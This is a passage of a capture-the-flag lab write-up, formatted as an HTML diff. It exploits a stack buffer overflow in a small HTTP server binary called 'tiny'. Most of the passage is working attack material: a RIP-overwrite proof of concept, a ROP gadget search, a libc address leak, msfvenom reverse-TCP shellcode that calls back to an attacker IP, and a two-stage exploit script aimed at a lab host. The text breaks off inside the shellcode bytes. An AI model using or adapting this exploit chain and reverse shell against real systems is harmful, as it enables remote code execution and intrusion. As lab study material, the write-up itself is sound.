+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; set follow-fork-mode child
+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; b *0x000000000040178b
+</span><span style="color:#bf616a;">Breakpoint</span><span> 1 at 0x40178b: file tiny.c, line 268.
+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; r
+</span><span style="color:#bf616a;">Starting</span><span> program: /ctf/work/tiny 
+</span><span style="color:#bf616a;">warning:</span><span> Error disabling address space randomization: Operation not permitted
+</span><span style="color:#bf616a;">listen</span><span> on port 9999, fd is 3
+</span></code></pre>
+<h2 id="test-poc">Test POC</h2>
+<p>Run this simple POC:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>root@--name:/ctf/work</span><span style="color:#65737e;"># cat padding.py 
+</span><span style="color:#b48ead;">import </span><span>requests
+</span><span style="color:#b48ead;">import </span><span>struct
+</span><span style="color:#b48ead;">import </span><span>socket
+</span><span>
+</span><span>padding = &quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">568
+</span><span style="color:#bf616a;">RIP </span><span>= </span><span style="color:#d08770;">0x424242424242
+</span><span>
+</span><span>payload = &quot;&quot;
+</span><span>payload += padding
+</span><span>payload += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, </span><span style="color:#bf616a;">RIP</span><span>)
+</span><span>
+</span><span>s = socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>)
+</span><span>
+</span><span>s.</span><span style="color:#bf616a;">connect</span><span>((&quot;</span><span style="color:#a3be8c;">localhost</span><span>&quot;, </span><span style="color:#d08770;">9999</span><span>))
+</span><span>s.</span><span style="color:#bf616a;">send</span><span>(&quot;</span><span style="color:#a3be8c;">GET /</span><span style="color:#d08770;">{} </span><span style="color:#96b5b4;">\n\n</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(payload))
+</span><span>s.</span><span style="color:#bf616a;">close</span><span>()
+</span></code></pre>
+<p>As soon as we hit a break point:</p>
+<pre data-lang="example" style="background-color:#2b303b;color:#c0c5ce;" class="language-example "><code class="language-example" data-lang="example"><span> ► f 0           40178b url_decode+107
+</span><span>   f 1           4018af parse_request+287
+</span><span>   f 2           401e23 process.part+67
+</span><span>   f 3     424242424242
+</span><span>   f 4           400fa0 _start
+</span><span>   f 5       10fd963730
+</span><span>   f 6  100007f1ccf0002
+</span><span>   f 7                0
+</span><span>Breakpoint *0x000000000040178b
+</span><span>pwndbg&gt; c
+</span></code></pre>
+<p>We can se our 424242424242 on the stack, and continue:</p>
+<pre data-lang="example" style="background-color:#2b303b;color:#c0c5ce;" class="language-example "><code class="language-example" data-lang="example"><span>Program received signal SIGSEGV (fault address 0x424242424242)
+</span></code></pre>
+<p>And as expected:</p>
+<p><img src="/images/smasher-2018-11-22/2025-01-18_19-16-42_image.png" alt="" /></p>
+<p>We have overwritten RIP with our 0x424242424242 bytes.</p>
+<h1 id="futher-exploitation-plan">Futher exploitation plan</h1>
+<p>Plan is: 1. Find gadget for pop rdi; pop rsi; ret. 2. Return to
+write@plt to leak read@got address so we can use that address from GOT
+to calculate base address of libc ( Remmber ASLR is ON). 2. Find gadget
+to push RSP so we can execute out shellcode from stack. We don't need
+to overwrite system entry on GOT and return to that because NX is off.
+3. Send another payload containing out shellcode, push RSP and check if
+it gets exeuted</p>
+<p>To find gadgets, i've used ropper ( <a href="https://github.com/sashs/Ropper">Ropper @
+github</a> ), you can use whatever you
+want. Lets's find out which gadgets can we find inside tiny binary.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> ropper</span><span style="color:#bf616a;"> --file</span><span> tiny</span><span style="color:#bf616a;"> --search </span><span>&quot;</span><span style="color:#a3be8c;">% ?di; ret</span><span>&quot;
+</span><span style="color:#bf616a;">[INFO]</span><span> Load gadgets from cache
+</span><span style="color:#bf616a;">[LOAD]</span><span> loading... 100%
+</span><span style="color:#bf616a;">[LOAD]</span><span> removing double gadgets... 100%
+</span><span style="color:#bf616a;">[INFO]</span><span> Searching for gadgets: % ?di; </span><span style="color:#bf616a;">ret
+</span><span>
+</span><span style="color:#bf616a;">[INFO]</span><span> File: tiny
+</span><span style="color:#bf616a;">0x00000000004011dd:</span><span> pop rdi; </span><span style="color:#bf616a;">ret</span><span>;
+</span></code></pre>
+<p>In tiny i found only pop RDI; ret. And we need pop RDI; pop RSI; ret. So
+we have to chain them. Next on the list is pop RSI, and i find one which
+pops RSI, then pop R15 and returns. That's good enough, since we are
+gona put some trash in R15 because we don't need it.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> ropper</span><span style="color:#bf616a;"> --file</span><span> tiny</span><span style="color:#bf616a;"> --search </span><span>&quot;</span><span style="color:#a3be8c;">pop ?si</span><span>&quot;
+</span><span style="color:#bf616a;">[INFO]</span><span> Load gadgets from cache
+</span><span style="color:#bf616a;">[LOAD]</span><span> loading... 100%
+</span><span style="color:#bf616a;">[LOAD]</span><span> removing double gadgets... 100%
+</span><span style="color:#bf616a;">[INFO]</span><span> Searching for gadgets: pop ?si
+</span><span>
+</span><span style="color:#bf616a;">[INFO]</span><span> File: tiny
+</span><span style="color:#bf616a;">.....
+</span><span style="color:#bf616a;">0x00000000004011db:</span><span> pop rsi; </span><span style="color:#bf616a;">pop</span><span> r15; </span><span style="color:#bf616a;">ret</span><span>; 
+</span></code></pre>
+<p>Last one, push RSP, which we need for last stage of exploit, we are
+going to look for inside libc.so.6 which is downloaded from the server,
+because i couln't find one in tiny binary. Note: we will find offset to
+it, which needs to be added to libc base address later.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> ropper</span><span style="color:#bf616a;"> --file</span><span> libc.so.6</span><span style="color:#bf616a;"> --search </span><span>&quot;</span><span style="color:#a3be8c;">push rsp</span><span>&quot;
+</span><span style="color:#bf616a;">[INFO]</span><span> Load gadgets from cache
+</span><span style="color:#bf616a;">[LOAD]</span><span> loading... 100%
+</span><span style="color:#bf616a;">[LOAD]</span><span> removing double gadgets... 42%
+</span><span style="color:#bf616a;">[LOAD]</span><span> removing double gadgets... 100%
+</span><span style="color:#bf616a;">[INFO]</span><span> Searching for gadgets: push rsp
+</span><span>
+</span><span style="color:#bf616a;">[INFO]</span><span> File: libc.so.6
+</span><span style="color:#bf616a;">......
+</span><span style="color:#bf616a;">0x0000000000023ad1:</span><span> push rsp; </span><span style="color:#bf616a;">ret</span><span>; 
+</span><span style="color:#bf616a;">......
+</span></code></pre>
+<p>So we have all of them:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>
+</span><span style="color:#65737e;"># gadgets
+</span><span>poprdiret = </span><span style="color:#d08770;">0x4011dd </span><span style="color:#65737e;"># pop rdi; ret
+</span><span>poprsiret = </span><span style="color:#d08770;">0x4011db </span><span style="color:#65737e;"># pop rsi; pop r15; ret
+</span><span>push_rsp  = </span><span style="color:#d08770;">0x023ad1 </span><span style="color:#65737e;"># push rsp; ret
+</span></code></pre>
+<p>Next, let's find read@got and read offset in libc address and write
+@plt address.</p>
+<p>We can see address of write@plt if we disassemble process function.
+There's a call to it:</p>
+<p><img src="/images/smasher-2018-11-22/2025-01-18_19-17-16_image.png" alt="" /></p>
+<pre data-lang="example" style="background-color:#2b303b;color:#c0c5ce;" class="language-example "><code class="language-example" data-lang="example"><span>0x00000000004010e9 &lt;+41&gt;: call   0x400c50 &lt;write@plt&gt;
+</span></code></pre>
+<p>That's done, now on to read@GOT.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> objdump</span><span style="color:#bf616a;"> -R</span><span> tiny | </span><span style="color:#bf616a;">grep</span><span> read
+</span><span style="color:#bf616a;">0000000000603088</span><span> R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
+</span></code></pre>
+<p>And lastly we need read() offset from libc.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> readelf</span><span style="color:#bf616a;"> -s</span><span> libc.so.6 | </span><span style="color:#bf616a;">grep</span><span> read@
+</span><span style="color:#bf616a;">....
+</span><span style="color:#bf616a;">891:</span><span> 00000000000f7250    90 FUNC    WEAK   DEFAULT   13 read@@GLIBC_2.2.5
+</span></code></pre>
+<p>Let's write that down, so far we have:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>
+</span><span style="color:#65737e;"># padding to RIP
+</span><span>padding = &quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">568
+</span><span>
+</span><span style="color:#65737e;"># got and plt
+</span><span>read_got = </span><span style="color:#d08770;">0x603088 </span><span style="color:#65737e;"># read()@GOT address
+</span><span>write_plt = </span><span style="color:#d08770;">0x400c50 </span><span style="color:#65737e;"># write()@PLT address
+</span><span>
+</span><span style="color:#65737e;"># offsets
+</span><span>read_off = </span><span style="color:#d08770;">0x0f7250 </span><span style="color:#65737e;"># read() offset from libc base
+</span><span>
+</span><span style="color:#65737e;"># gadgets
+</span><span>poprdiret = </span><span style="color:#d08770;">0x4011dd </span><span style="color:#65737e;"># pop rdi; ret
+</span><span>poprsiret = </span><span style="color:#d08770;">0x4011db </span><span style="color:#65737e;"># pop rsi; pop r15; ret
+</span><span>push_rsp  = </span><span style="color:#d08770;">0x023ad1 </span><span style="color:#65737e;"># push rsp; ret
+</span></code></pre>
+<p>Ok, time for first stage. Let's try to leak address of read() and
+substract read~off~ (offset) to get libc base address.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>
+</span><span style="color:#b48ead;">import </span><span>httplib
+</span><span style="color:#b48ead;">import </span><span>struct
+</span><span style="color:#b48ead;">import </span><span>socket
+</span><span style="color:#b48ead;">import </span><span>telnetlib
+</span><span style="color:#b48ead;">import </span><span>urllib
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">execute_payload</span><span>(</span><span style="color:#bf616a;">payload</span><span>):
+</span><span>    s = socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>)
+</span><span>    s.</span><span style="color:#bf616a;">connect</span><span>((&quot;</span><span style="color:#a3be8c;">localhost</span><span>&quot;, </span><span style="color:#d08770;">9999</span><span>))
+</span><span>    </span><span style="color:#65737e;">#s.connect((&quot;10.10.10.89&quot;, 1111))
+</span><span>    s.</span><span style="color:#bf616a;">send</span><span>(&quot;</span><span style="color:#a3be8c;">GET /</span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;"> HTTP/1.1</span><span style="color:#96b5b4;">\r\n\r\n</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(urllib.</span><span style="color:#bf616a;">quote_plus</span><span>(payload)))
+</span><span>    response = s.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#d08770;">4096</span><span>)
+</span><span>    s.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>    </span><span style="color:#b48ead;">return </span><span>response
+</span><span>
+</span><span style="color:#65737e;"># padding to RIP
+</span><span>padding = &quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">568
+</span><span>
+</span><span style="color:#65737e;"># got and plt
+</span><span>read_got = </span><span style="color:#d08770;">0x603088 </span><span style="color:#65737e;"># read()@GOT address
+</span><span>write_plt = </span><span style="color:#d08770;">0x400c50 </span><span style="color:#65737e;"># write()@PLT address
+</span><span>
+</span><span style="color:#65737e;"># offsets
+</span><span>system_off = </span><span style="color:#d08770;">0x045390
+</span><span>read_off = </span><span style="color:#d08770;">0x0f7250 </span><span style="color:#65737e;"># read() offset from libc base
+</span><span>
+</span><span style="color:#65737e;"># gadgets
+</span><span>poprdiret = </span><span style="color:#d08770;">0x4011dd </span><span style="color:#65737e;"># pop rdi; ret
+</span><span>poprsiret = </span><span style="color:#d08770;">0x4011db </span><span style="color:#65737e;"># pop rsi; pop r15; ret
+</span><span>push_rsp  = </span><span style="color:#d08770;">0x023ad1 </span><span style="color:#65737e;"># push rsp; ret
+</span><span>
+</span><span style="color:#65737e;">#### 1 - leak the libc base
+</span><span>buf = &quot;&quot;
+</span><span>buf += padding
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, poprdiret)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, </span><span style="color:#d08770;">0x4</span><span>)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, poprsiret)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, read_got)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, </span><span style="color:#d08770;">0xF</span><span>)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, write_plt)
+</span><span>
+</span><span>response = </span><span style="color:#bf616a;">execute_payload</span><span>(buf).</span><span style="color:#bf616a;">split</span><span>(&quot;</span><span style="color:#a3be8c;">File not found</span><span>&quot;)[</span><span style="color:#d08770;">1</span><span>]           
+</span><span>read_addr = struct.</span><span style="color:#bf616a;">unpack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, response[:</span><span style="color:#d08770;">8</span><span>])[</span><span style="color:#d08770;">0</span><span>]
+</span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">read() is at</span><span>&quot;, </span><span style="color:#96b5b4;">hex</span><span>(read_addr)
+</span><span>
+</span><span>libc_addr = read_addr - read_off
+</span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">libc base is at</span><span>&quot;, </span><span style="color:#96b5b4;">hex</span><span>(libc_addr)
+</span></code></pre>
+<p>Fire up GDB again, and rerun the tiny in the same way. Set breakpoint,
+and hit r.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> gdb</span><span style="color:#bf616a;"> -q</span><span> tiny
+</span><span style="color:#bf616a;">Reading</span><span> symbols from tiny...done.
+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; b *0x000000000040178b
+</span><span style="color:#bf616a;">Breakpoint</span><span> 1 at 0x40178b: file tiny.c, line 268.
+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; r
+</span><span style="color:#bf616a;">Starting</span><span> program: /ctf/work/tiny 
+</span><span style="color:#bf616a;">warning:</span><span> Error disabling address space randomization: Operation not permitted
+</span><span style="color:#bf616a;">listen</span><span> on port 9999, fd is 3
+</span></code></pre>
+<p>Go open another tab or something and run our script:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">root@--name:/ctf/work#</span><span> python stage1.py 
+</span><span style="color:#8fa1b3;">read</span><span>() is at 0x7fa328ae2250
+</span><span>libc base is at 0x7fa3289eb000
+</span></code></pre>
+<p>Nice, so let's confirm that this indeed works. We are going to look and
+disassemble 0x7fa328ae2250 which is suposed to be address of read()
+function.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">pwndbg</span><span>&gt; disassemble 0x7fa328ae2250
+</span><span style="color:#bf616a;">Dump</span><span> of assembler code for function read:
+</span><span>   </span><span style="color:#bf616a;">0x00007fa328ae2250 </span><span>&lt;+0&gt;: cmp    DWORD PTR </span><span style="color:#b48ead;">[</span><span>rip+0x2d24e9</span><span style="color:#b48ead;">]</span><span>,0x0        </span><span style="color:#65737e;"># 0x7fa328db4740 &lt;__libc_multiple_threads&gt;
+</span><span>   </span><span style="color:#bf616a;">0x00007fa328ae2257 </span><span>&lt;+7&gt;: jne    0x7fa328ae2269 &lt;read+25&gt;
+</span><span>   </span><span style="color:#bf616a;">0x00007fa328ae2259 </span><span>&lt;+0&gt;: mov    eax,0x0
+</span><span>   </span><span style="color:#bf616a;">....
+</span></code></pre>
+<p>And it indeed is. We successfuly leaked address of read, and thus are
+able to calculate base of the libc ( you can play out, and test this by
+adding offsets to other functions/calls and check if they match).</p>
+<p>Allright, now let's wrap up this. Since we now can tell where push RSP
+will be, we can use it to execute our shellcode from stack. For sake of
+simplicity, i'm going to use msfvenom to generate reverse~tcp~
+shellcode for x64, and use handler to connected back to it.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[badarg:/opt/metasploit-framework/bin]$</span><span> ./msfvenom</span><span style="color:#bf616a;"> -p</span><span> linux/x64/shell/reverse_tcp LHOST=10.10.13.238 LPORT=4444</span><span style="color:#bf616a;">  --bad-chars </span><span>&quot;</span><span style="color:#a3be8c;">\x00</span><span>&quot;</span><span style="color:#bf616a;"> -f</span><span> python                                                        
+</span><span style="color:#bf616a;">[-]</span><span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+</span><span style="color:#bf616a;">[-]</span><span> No arch selected, selecting arch: x64 from the payload
+</span><span style="color:#bf616a;">Found</span><span> 2 compatible encoders
+</span><span style="color:#bf616a;">Attempting</span><span> to encode payload with 1 iterations of generic/none
+</span><span style="color:#bf616a;">generic/none</span><span> failed with Encoding failed due to a bad character (index=56, char=0x00)
+</span><span style="color:#bf616a;">Attempting</span><span> to encode payload with 1 iterations of x64/xor
+</span><span style="color:#bf616a;">x64/xor</span><span> succeeded with size 175 (iteration=0)
+</span><span style="color:#bf616a;">x64/xor</span><span> chosen with final size 175
+</span><span style="color:#bf616a;">Payload</span><span> size: 175 bytes
+</span><span style="color:#bf616a;">Final</span><span> size of python file: 850 bytes
+</span><span style="color:#bf616a;">buf</span><span> =  &quot;&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xef\xff\xff\xff\x48\xbb\x6b\xa3\xb0\x9e\x3c\xe7\x62</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xc7\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\x23\x92\x4f\xf4\x35\xbf\xfb\x71\x7b\xeb\x39\x48\x71</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xd6\xab\xad\x49\xe2\xea\x2c\x3b\xe8\x67\x8f\xee\x63</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xc8\xcc\x56\xed\x23\x9e\x3d\xf3\xda\xb7\x64\x7e\x08</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xc5\x34\xc9\xb1\xc0\x33\xe2\x2a\x42\xab\xdb\x8b\xd6</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xab\xaf\xdb\xc5\x6b\xb2\xec\x94\x36\xea\x8c\x96\x23</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\x2a\x56\xf4\x2c\xbd\x08\xed\x33\xac\xb5\xc7\x74\x62</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xa2\xbe\x4e\xea\x4f\x57\x48\xff\x35\xad\x48\xfb\xda</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\x9e\x56\xe2\x2a\x4e\x8c\xeb\x81\x68\x33\xe2\x3b\x9e</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\x34\xeb\x35\x5e\x45\x20\x08\xfb\x33\xc9\xb1\xc1\x33</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xe2\x3c\x9d\x64\xa6\xf8\x1b\xfc\x9f\x8d\x38\x8d\xa3</span><span>&quot;
+</span><span style="color:#bf616a;">buf</span><span> += &quot;</span><span style="color:#a3be8c;">\xb0\x9e\x3c\xe7\x62\xc7</span><span>&quot;
+</span></code></pre>
+<p>That will be a shellcode, and let's put together rest of our exploit.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>
+</span><span style="color:#b48ead;">import </span><span>httplib
+</span><span style="color:#b48ead;">import </span><span>struct
+</span><span style="color:#b48ead;">import </span><span>socket
+</span><span style="color:#b48ead;">import </span><span>telnetlib
+</span><span style="color:#b48ead;">import </span><span>urllib
+</span><span>
+</span><span>
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://10.10.10.89:1111/</span><span>&quot;
+</span><span>lurl = &quot;</span><span style="color:#a3be8c;">http://localhost:9999/</span><span>&quot;
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">execute_payload</span><span>(</span><span style="color:#bf616a;">payload</span><span>):
+</span><span>    s = socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>)
+</span><span>    s.</span><span style="color:#bf616a;">connect</span><span>((&quot;</span><span style="color:#a3be8c;">10.10.10.89</span><span>&quot;, </span><span style="color:#d08770;">1111</span><span>))
+</span><span>    s.</span><span style="color:#bf616a;">send</span><span>(&quot;</span><span style="color:#a3be8c;">GET /</span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;"> HTTP/1.1</span><span style="color:#96b5b4;">\r\n\r\n</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(urllib.</span><span style="color:#bf616a;">quote_plus</span><span>(payload)))
+</span><span>    response = s.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#d08770;">4096</span><span>)
+</span><span>    s.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>    </span><span style="color:#b48ead;">return </span><span>response
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">exploit</span><span>(</span><span style="color:#bf616a;">payload</span><span>):
+</span><span>    s = socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>)
+</span><span>    </span><span style="color:#65737e;">#s.connect((&quot;localhost&quot;, 9999))
+</span><span>    s.</span><span style="color:#bf616a;">connect</span><span>((&quot;</span><span style="color:#a3be8c;">10.10.10.89</span><span>&quot;, </span><span style="color:#d08770;">1111</span><span>))
+</span><span>    s.</span><span style="color:#bf616a;">send</span><span>(&quot;</span><span style="color:#a3be8c;">GET /</span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;"> HTTP/1.1</span><span style="color:#96b5b4;">\r\n\r\n</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(urllib.</span><span style="color:#bf616a;">quote_plus</span><span>(payload)))
+</span><span>    </span><span style="color:#65737e;"># get a shell
+</span><span>
+</span><span style="color:#65737e;"># padding to RIP
+</span><span>padding = &quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">568
+</span><span>
+</span><span style="color:#65737e;"># got and plt
+</span><span>read_got = </span><span style="color:#d08770;">0x603088 </span><span style="color:#65737e;"># read()@GOT address
+</span><span>write_plt = </span><span style="color:#d08770;">0x400c50 </span><span style="color:#65737e;"># write()@PLT address
+</span><span>
+</span><span style="color:#65737e;"># offsets
+</span><span>read_off = </span><span style="color:#d08770;">0x0f7250 </span><span style="color:#65737e;"># read() offset from libc base
+</span><span>
+</span><span style="color:#65737e;"># gadgets
+</span><span>poprdiret = </span><span style="color:#d08770;">0x4011dd </span><span style="color:#65737e;"># pop rdi; ret
+</span><span>poprsiret = </span><span style="color:#d08770;">0x4011db </span><span style="color:#65737e;"># pop rsi; pop r15; ret
+</span><span>push_rsp  = </span><span style="color:#d08770;">0x023ad1 </span><span style="color:#65737e;"># push rsp; ret
+</span><span>
+</span><span style="color:#65737e;">#### 1 - leak the libc base
+</span><span>buf = &quot;&quot;
+</span><span>buf += padding
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, poprdiret)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, </span><span style="color:#d08770;">0x4</span><span>)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, poprsiret)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, read_got)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, </span><span style="color:#d08770;">0xF</span><span>)
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, write_plt)
+</span><span>
+</span><span>response = </span><span style="color:#bf616a;">execute_payload</span><span>(buf).</span><span style="color:#bf616a;">split</span><span>(&quot;</span><span style="color:#a3be8c;">File not found</span><span>&quot;)[</span><span style="color:#d08770;">1</span><span>]           
+</span><span>read_addr = struct.</span><span style="color:#bf616a;">unpack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;, response[:</span><span style="color:#d08770;">8</span><span>])[</span><span style="color:#d08770;">0</span><span>]
+</span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">read() is at</span><span>&quot;, </span><span style="color:#96b5b4;">hex</span><span>(read_addr)
+</span><span>
+</span><span>libc_addr = read_addr - read_off
+</span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">libc base is at</span><span>&quot;, </span><span style="color:#96b5b4;">hex</span><span>(libc_addr)
+</span><span>
+</span><span style="color:#65737e;">#### 2 - Execute shellcode from stack
+</span><span>
+</span><span>gadget = libc_addr + push_rsp
+</span><span>
+</span><span>buf = &quot;&quot;
+</span><span>buf += padding
+</span><span>buf += struct.</span><span style="color:#bf616a;">pack</span><span>(&quot;</span><span style="color:#a3be8c;">&lt;Q</span><span>&quot;,  gadget)
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\xef\xff\xff\xff\x48\xbb\xc7\xa4\xa1\x8a\x02\xe7\x6d</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x1b\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x8f\x95\x5e\xe0\x0b\xbf\xf4\xad\xd7\xec\x28\x5c\x4f</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\xd6\xa4\x71\xe5\xe5\xfb\x38\x05\xe8\x68\x53\x42\x64</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\xd9\xd8\x68\xed\x2c\x42\x91\xf4\xcb\xa3\x5a\x7e\x07</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x19\x98\xce\xa0\xd4\x0d\xe2\x25\x9e\x07\xdc\x9a\xc2</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x95\xaf\xd4\x19\xc7\xb5\xfd\x80\x08\xea\x83\x4a\x8f</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x2d\x47\xe0\x12\xbd\x07\x31\x9f\xab\xa4\xd3\x4a\x62</span><span>&quot;
